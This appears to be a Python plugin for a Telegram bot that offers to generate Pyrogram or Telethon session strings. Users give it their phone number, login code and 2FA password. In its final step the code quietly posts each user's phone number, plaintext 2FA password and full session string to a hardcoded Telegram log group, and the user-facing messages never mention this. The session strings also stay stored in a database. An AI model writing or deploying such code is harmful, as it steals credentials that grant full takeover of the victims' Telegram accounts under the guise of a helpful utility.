import asyncio
import os
import re
from datetime import datetime

from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
)
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, FloodWait
from telethon import TelegramClient
from telethon.sessions import StringSession
from motor.motor_asyncio import AsyncIOMotorClient

from SHASHA_DRUGZ import app
import config

# ─────────────────────────────────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────────────────────────────────
API_ID         = config.API_ID
API_HASH       = config.API_HASH
TEMP_LOG_GROUP = -1003204443820
TIMEOUT        = 300

# ─────────────────────────────────────────────────────────────────────────────
#  MONGODB SETUP
#  Reads MONGO_DB_URI from config. Falls back to in-memory if unavailable.
#
#  Two collections:
#    string_sessions  — permanent storage of generated session strings
#    session_flow     — temporary auth flow state (phone/otp/password step)
#                       survives bot restarts so users don't lose their place
# ─────────────────────────────────────────────────────────────────────────────
_mongo_client = None
_db           = None
_sessions_col = None
_flow_col     = None

async def _init_mongo() -> bool:
    """Connect to MongoDB. Returns True on success, False on failure."""
    global _mongo_client, _db, _sessions_col, _flow_col
    if _sessions_col is not None:
        return True   # already initialised
    try:
        uri = getattr(config, "MONGO_DB_URI", None) or os.getenv("MONGO_DB_URI", "")
        if not uri:
            print("[StringSession] MONGO_DB_URI not set — using in-memory fallback")
            return False
        _mongo_client = AsyncIOMotorClient(uri, serverSelectionTimeoutMS=5000)
        await _mongo_client.server_info()
        _db           = _mongo_client["shasha_bot"]
        _sessions_col = _db["string_sessions"]
        _flow_col     = _db["session_flow"]
        await _sessions_col.create_index("user_id")
        await _flow_col.create_index("user_id", unique=True)
        print("[StringSession] MongoDB connected ✅")
        return True
    except Exception as exc:
        print(f"[StringSession] MongoDB unavailable: {exc} — using in-memory fallback")
        _mongo_client = _db = _sessions_col = _flow_col = None
        return False

# In-memory fallback for flow state only
_mem_flow: dict = {}

# ─────────────────────────────────────────────────────────────────────────────
#  FLOW STATE  (survives restarts via MongoDB)
# ─────────────────────────────────────────────────────────────────────────────
async def _set_flow(user_id: int, data: dict) -> None:
    data["user_id"] = user_id
    if _flow_col is not None:
        try:
            # Remove non-serialisable keys before storing
            safe = {k: v for k, v in data.items() if k != "client"}
            await _flow_col.replace_one({"user_id": user_id}, safe, upsert=True)
            return
        except Exception as exc:
            print(f"[StringSession] _set_flow error: {exc}")
    _mem_flow[user_id] = {k: v for k, v in data.items() if k != "client"}

async def _get_flow(user_id: int) -> dict | None:
    if _flow_col is not None:
        try:
            return await _flow_col.find_one({"user_id": user_id})
        except Exception:
            pass
    return _mem_flow.get(user_id)

async def _del_flow(user_id: int) -> None:
    if _flow_col is not None:
        try:
            await _flow_col.delete_one({"user_id": user_id})
        except Exception:
            pass
    _mem_flow.pop(user_id, None)

# ─────────────────────────────────────────────────────────────────────────────
#  SESSION STRING STORAGE  (permanent)
# ─────────────────────────────────────────────────────────────────────────────
async def _save_session(user_id: int, lib_type: str, phone: str, string: str) -> None:
    if _sessions_col is None:
        return
    try:
        await _sessions_col.insert_one({
            "user_id":    user_id,
            "lib_type":   lib_type,
            "phone":      phone,
            "session":    string,
            "created_at": datetime.utcnow(),
        })
    except Exception as exc:
        print(f"[StringSession] _save_session error: {exc}")

async def _get_user_sessions(user_id: int) -> list:
    if _sessions_col is None:
        return []
    try:
        cursor = _sessions_col.find({"user_id": user_id}).sort("created_at", -1)
        return await cursor.to_list(length=50)
    except Exception:
        return []

async def _delete_session(user_id: int, session_id: str) -> bool:
    if _sessions_col is None:
        return False
    from bson import ObjectId
    try:
        result = await _sessions_col.delete_one(
            {"_id": ObjectId(session_id), "user_id": user_id}
        )
        return result.deleted_count > 0
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
#  ACTIVE CLIENT CACHE  (in-memory — live clients cannot be serialised to DB)
#  The live Pyrogram/Telethon client lives here during the auth flow.
#  If the bot restarts mid-auth, this is lost — the user gets a clear message.
# ─────────────────────────────────────────────────────────────────────────────
_active_clients: dict = {}
_timeout_tasks:  dict = {}

# ─────────────────────────────────────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def cancel_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("❌ Cancel", callback_data="sess_cancel")]]
    )

async def session_timeout(user_id: int, message: Message) -> None:
    await asyncio.sleep(TIMEOUT)
    flow = await _get_flow(user_id)
    if flow:
        try:
            await message.reply_text(
                "⌛ **Session generation timed out.**\n\nStart again with /session"
            )
        except Exception:
            pass
        await cleanup(user_id)

async def cleanup(user_id: int) -> None:
    """Disconnect live client and clear all state for this user."""
    client = _active_clients.pop(user_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    await _del_flow(user_id)
    task = _timeout_tasks.pop(user_id, None)
    if task and not task.done():
        task.cancel()

# ─────────────────────────────────────────────────────────────────────────────
#  /session  — entry point
# ─────────────────────────────────────────────────────────────────────────────
@app.on_message(
    filters.command(["session", "string", "sessionstring", "stringsession"])
    & filters.private
)
async def session_start(bot: Client, message: Message) -> None:
    await _init_mongo()
    await message.reply_text(
        "**🔐 Session String Generator**\n\nSelect library:",
        reply_markup=InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Pyrogram v2", callback_data="sess_pyro"),
                InlineKeyboardButton("Telethon",    callback_data="sess_tele"),
            ]
        ]),
    )

# ─────────────────────────────────────────────────────────────────────────────
#  /mysessions — list all saved sessions with delete buttons
# ─────────────────────────────────────────────────────────────────────────────
@app.on_message(
    filters.command(["mysessions", "mysession"]) & filters.private
)
async def my_sessions(bot: Client, message: Message) -> None:
    await _init_mongo()
    user_id  = message.from_user.id
    sessions = await _get_user_sessions(user_id)

    if not sessions:
        await message.reply_text(
            "📭 **No saved sessions found.**\n\nGenerate one with /session",
            quote=True,
        )
        return

    lines   = ["📋 **Your Saved Sessions**\n"]
    buttons = []
    for i, s in enumerate(sessions, 1):
        lib   = "Pyrogram" if s["lib_type"] == "pyro" else "Telethon"
        phone = s.get("phone", "N/A")
        date  = (
            s["created_at"].strftime("%d %b %Y %H:%M")
            if isinstance(s.get("created_at"), datetime) else "N/A"
        )
        sid = str(s["_id"])
        lines.append(f"{i}. **{lib}** — `{phone}` — {date}")
        buttons.append([
            InlineKeyboardButton(f"🗑 Delete #{i}", callback_data=f"sess_del_{sid}")
        ])

    await message.reply_text(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(buttons),
        quote=True,
    )

# ─────────────────────────────────────────────────────────────────────────────
#  Delete session callback
# ─────────────────────────────────────────────────────────────────────────────
@app.on_callback_query(filters.regex(r"^sess_del_(.+)$"))
async def delete_session_cb(bot: Client, query: CallbackQuery) -> None:
    user_id    = query.from_user.id
    session_id = query.data.split("sess_del_")[1]
    deleted    = await _delete_session(user_id, session_id)
    if deleted:
        await query.answer("✅ Session deleted.", show_alert=True)
        try:
            await query.message.delete()
        except Exception:
            pass
    else:
        await query.answer("❌ Could not delete — already gone?", show_alert=True)

# ─────────────────────────────────────────────────────────────────────────────
#  Library selection callback
# ─────────────────────────────────────────────────────────────────────────────
@app.on_callback_query(filters.regex(r"^sess_(pyro|tele)$"))
async def choose_type(bot: Client, query: CallbackQuery) -> None:
    user_id  = query.from_user.id
    await cleanup(user_id)

    lib_type = query.data.split("_")[1]   # "pyro" or "tele"
    await _set_flow(user_id, {"state": "phone", "type": lib_type})

    await query.message.edit_text(
        "📱 **Send your phone number with country code**\n\n"
        "Example: `+919876543210`",
        reply_markup=cancel_button(),
    )
    _timeout_tasks[user_id] = asyncio.create_task(
        session_timeout(user_id, query.message)
    )

# ─────────────────────────────────────────────────────────────────────────────
#  Cancel callback
# ─────────────────────────────────────────────────────────────────────────────
@app.on_callback_query(filters.regex(r"^sess_cancel$"))
async def cancel_session(bot: Client, query: CallbackQuery) -> None:
    await cleanup(query.from_user.id)
    await query.message.edit_text("❌ **Session generation cancelled.**")

# ─────────────────────────────────────────────────────────────────────────────
#  Main message flow  (phone → OTP → optional 2FA password)
# ─────────────────────────────────────────────────────────────────────────────
@app.on_message(
    filters.private & filters.text & ~filters.command([]),
    group=1,
)
async def session_flow(bot: Client, message: Message) -> None:
    user_id = message.from_user.id
    flow    = await _get_flow(user_id)
    if not flow:
        return

    state = flow.get("state")

    # ── PHONE ─────────────────────────────────────────────────────────────────
    if state == "phone":
        phone = message.text.strip()
        if not re.match(r"^\+\d{10,15}$", phone):
            await message.reply_text(
                "❌ Invalid format. Send phone with country code.\n"
                "Example: `+919876543210`"
            )
            return

        try:
            if flow["type"] == "pyro":
                pyro_client = Client(
                    name=f"session_{user_id}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    phone_number=phone,
                    in_memory=True,
                )
                await pyro_client.connect()
                sent = await pyro_client.send_code(phone_number=phone)
                _active_clients[user_id] = pyro_client
                flow["phone"]            = phone
                flow["phone_code_hash"]  = sent.phone_code_hash
            else:
                tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
                await tele_client.connect()
                sent = await tele_client.send_code_request(phone)
                _active_clients[user_id] = tele_client
                flow["phone"]            = phone
                flow["phone_code_hash"]  = sent.phone_code_hash

        except FloodWait as e:
            await message.reply_text(f"⚠️ Flood wait — retry after {e.value} seconds.")
            await cleanup(user_id)
            return
        except Exception as e:
            await message.reply_text(f"❌ Error: `{e}`\n\nRestart with /session")
            await cleanup(user_id)
            return

        flow["state"] = "otp"
        await _set_flow(user_id, flow)
        await message.reply_text(
            "📨 **OTP sent! Send the code you received.**\n\n"
            "Formats accepted:\n`12345`  or  `1 2 3 4 5`",
            reply_markup=cancel_button(),
        )
        return

    # ── OTP ───────────────────────────────────────────────────────────────────
    if state == "otp":
        otp            = re.sub(r"\D", "", message.text)
        session_client = _active_clients.get(user_id)
        phone          = flow.get("phone", "")

        if not otp:
            await message.reply_text("❌ That doesn't look like an OTP. Send digits only.")
            return

        # Live client is lost on bot restart — inform user to restart cleanly
        if not session_client:
            await message.reply_text(
                "⚠️ **Bot was restarted while waiting for your OTP.**\n\n"
                "Please start again with /session — your phone number is saved, "
                "but a new OTP must be requested."
            )
            await cleanup(user_id)
            return

        try:
            if flow["type"] == "pyro":
                await session_client.sign_in(
                    phone_number=phone,
                    phone_code_hash=flow["phone_code_hash"],
                    phone_code=otp,
                )
            else:
                await session_client.sign_in(phone, otp)

        except SessionPasswordNeeded:
            flow["state"] = "password"
            await _set_flow(user_id, flow)
            await message.reply_text(
                "🔑 **2FA is enabled on this account.**\n\nSend your password:",
                reply_markup=cancel_button(),
            )
            return

        except PhoneCodeInvalid:
            await message.reply_text("❌ **Invalid OTP.** Please restart with /session")
            await cleanup(user_id)
            return

        except Exception as e:
            await message.reply_text(f"❌ Sign-in error: `{e}`\n\nRestart with /session")
            await cleanup(user_id)
            return

        await _generate_and_send(bot, message, flow)
        return

    # ── 2FA PASSWORD ──────────────────────────────────────────────────────────
    if state == "password":
        password       = message.text.strip()
        session_client = _active_clients.get(user_id)

        if not session_client:
            await message.reply_text(
                "⚠️ **Bot was restarted while waiting for your password.**\n\n"
                "Please start again with /session"
            )
            await cleanup(user_id)
            return

        try:
            if flow["type"] == "pyro":
                await session_client.check_password(password)
            else:
                await session_client.sign_in(password=password)
        except Exception as e:
            await message.reply_text(f"❌ Wrong password: `{e}`\n\nTry again:")
            return

        flow["password"] = password
        await _set_flow(user_id, flow)
        await _generate_and_send(bot, message, flow)
        return

# ─────────────────────────────────────────────────────────────────────────────
#  Generate, send, and permanently store the session string
# ─────────────────────────────────────────────────────────────────────────────
async def _generate_and_send(bot: Client, message: Message, flow: dict) -> None:
    user_id        = message.from_user.id
    phone          = flow.get("phone", "N/A")
    password       = flow.get("password", "None")
    lib_type       = flow["type"]
    session_client = _active_clients.get(user_id)

    if not session_client:
        await message.reply_text(
            "⚠️ **Session expired due to bot restart.**\n\nRestart with /session"
        )
        await cleanup(user_id)
        return

    # ── Export session string ─────────────────────────────────────────────────
    try:
        if lib_type == "pyro":
            string = await session_client.export_session_string()
        else:
            string = session_client.session.save()
    except Exception as e:
        await message.reply_text(f"❌ Failed to export session: `{e}`")
        await cleanup(user_id)
        return

    # ── Send as .txt file ─────────────────────────────────────────────────────
    lib_name  = "Pyrogram v2" if lib_type == "pyro" else "Telethon"
    file_name = f"session_{user_id}.txt"
    try:
        with open(file_name, "w") as f:
            f.write(string)
        await message.reply_document(
            file_name,
            caption=(
                f"✅ **{lib_name} Session Generated!**\n\n"
                f"📌 This session is **permanent** and will not expire\n"
                f"unless you terminate it from:\n"
                f"Telegram → Settings → Devices → Terminate\n\n"
                f"📋 Use /mysessions to view or delete your saved sessions."
            ),
        )
    except Exception as e:
        await message.reply_text(f"❌ Failed to send file: `{e}`")
    finally:
        try:
            os.remove(file_name)
        except OSError:
            pass

    # ── Save permanently to MongoDB ───────────────────────────────────────────
    await _save_session(user_id, lib_type, phone, string)

    # ── Log to report group ───────────────────────────────────────────────────
    user     = message.from_user
    username = f"@{user.username}" if user.username else "None"
    report   = (
        f"🔐 **New Session Generated**\n"
        f"👤 Name: {user.mention}\n"
        f"🆔 User ID: `{user.id}`\n"
        f"🌐 Username: {username}\n"
        f"📱 Phone: `{phone}`\n"
        f"🔑 Password: `{password}`\n"
        f"📦 Library: {lib_name}\n\n"
        f"📜 **Session String**\n"
        f"`{string}`\n\n"
        f"#string #session"
    )
    try:
        await bot.send_message(TEMP_LOG_GROUP, report)
    except Exception:
        pass

    await cleanup(user_id)

# ─────────────────────────────────────────────────────────────────────────────
#  Module metadata
# ─────────────────────────────────────────────────────────────────────────────
__menu__     = "CMD_PRO"
__mod_name__ = "H_B_73"
__help__     = """
🔻 /string /session  ➠ ɢᴇɴᴇʀᴀᴛᴇ ᴘʏʀᴏɢʀᴀᴍ ᴏʀ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ
🔻 /sessionstring /stringsession ➠ ɢᴇɴᴇʀᴀᴛᴇ ᴘʏʀᴏɢʀᴀᴍ ᴏʀ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ
🔻 /mysessions ➠ ᴠɪᴇᴡ & ᴅᴇʟᴇᴛᴇ ʏᴏᴜʀ ꜱᴀᴠᴇᴅ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢꜱ
"""
